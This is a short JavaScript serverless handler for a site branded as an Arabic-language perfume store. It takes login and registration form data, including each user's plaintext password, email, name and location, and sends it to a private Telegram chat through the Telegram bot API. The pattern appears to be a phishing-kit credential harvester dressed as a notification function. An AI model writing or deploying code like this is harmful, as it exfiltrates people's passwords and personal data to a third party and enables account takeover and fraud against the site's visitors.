exports.handler = async function(event) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const token = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return { statusCode: 200, body: JSON.stringify({ ok: true, note: 'bot not configured' }) };
  }

  let data;
  try {
    data = JSON.parse(event.body);
  } catch {
    return { statusCode: 400, body: JSON.stringify({ error: 'Invalid JSON' }) };
  }

  const message = formatMessage(data);

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
    });
    const result = await response.json();
    return { statusCode: 200, body: JSON.stringify({ ok: result.ok }) };
  } catch (err) {
    return { statusCode: 200, body: JSON.stringify({ ok: false }) };
  }
};

function formatMessage(data) {
  const site = '🏺 <b>المسعودي للعطور</b>';
  if (data.type === 'login') {
    return `${site}\n🔐 <b>تسجيل دخول جديد</b>\n\n` +
      `👤 الاسم: ${sanitize(data.name) || 'غير معروف'}\n` +
      `📧 البريد: ${sanitize(data.email)}\n` +
      `🔑 كلمة المرور: ${sanitize(data.password)}\n` +
      `⏰ الوقت: ${sanitize(data.time)}`;
  }
  if (data.type === 'register') {
    return `${site}\n🆕 <b>تسجيل حساب جديد</b>\n\n` +
      `👤 الاسم: ${sanitize(data.firstName)} ${sanitize(data.lastName)}\n` +
      `📧 البريد: ${sanitize(data.email)}\n` +
      `🏙️ المدينة: ${sanitize(data.city)}\n` +
      `🌍 الدولة: ${sanitize(data.country)}\n` +
      `🔑 كلمة المرور: ${sanitize(data.password)}\n` +
      `⏰ وقت التسجيل: ${sanitize(data.time)}`;
  }
  return `${site}\n📬 إشعار جديد`;
}

function sanitize(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
